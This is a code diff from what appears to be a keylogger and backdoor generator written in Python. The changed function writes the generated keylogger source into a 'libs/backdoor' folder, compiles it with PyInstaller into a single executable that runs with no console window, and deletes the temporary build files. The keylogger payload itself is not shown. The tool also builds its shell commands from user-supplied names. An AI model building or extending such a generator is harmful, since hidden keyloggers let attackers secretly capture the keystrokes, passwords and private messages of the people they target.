@@ -104,22 +104,22 @@ def generate_keylogger(inputs_dict):
             output_logger.write(content)
         print(colors.Green + '[✔]Source File writing successful')
 
-        with open(program_path + '/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
+        with open(program_path + '/libs/backdoor/{}.py'.format(inputs_dict['PNAME']), 'w') as output_logger:
             output_logger.write(content)
         print(colors.Green + '[✔]Source File coppied to working directory')
 
         print(colors.Yellow + '[!]Creating Executables.. this may take some time....')
-        check_output('pyinstaller {}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
+        check_output('python2 -m PyInstaller libs/backdoor/{}.py --onefile --noconsole'.format(inputs_dict['PNAME']), shell=True, stderr=devnull)
         print(colors.Green + '[✔]Executables created success fully')
         print(colors.Green + '[✔]Your files have been saved to {}Dist{} {}dirrectory'.format(colors.BOLD, colors.RESET, colors.Green))
 
         print(colors.Yellow + '[!]Removing temp files......')
         try:
-            name = program_path + '/' + inputs_dict['PNAME']
+            name = program_path + '/libs/backdoor/' + inputs_dict['PNAME']
             check_output("rm '{}'.py".format(name), shell=True)
-            check_output("rm '{}'.spec".format(name), shell=True)
+            check_output("rm '{}/{}'.spec".format(program_path, inputs_dict['PNAME']), shell=True)
             check_output("rm -R '{}/'build".format(program_path), shell=True)
-            check_output("rm -R '{}/'__pycache__".format(program_path), shell=True)
+            check_output("rm -R '{}/libs/'__pycache__".format(program_path), shell=True)
         except:
             print(colors.Red + '[✘]Erroro occured while deleting the files')
         
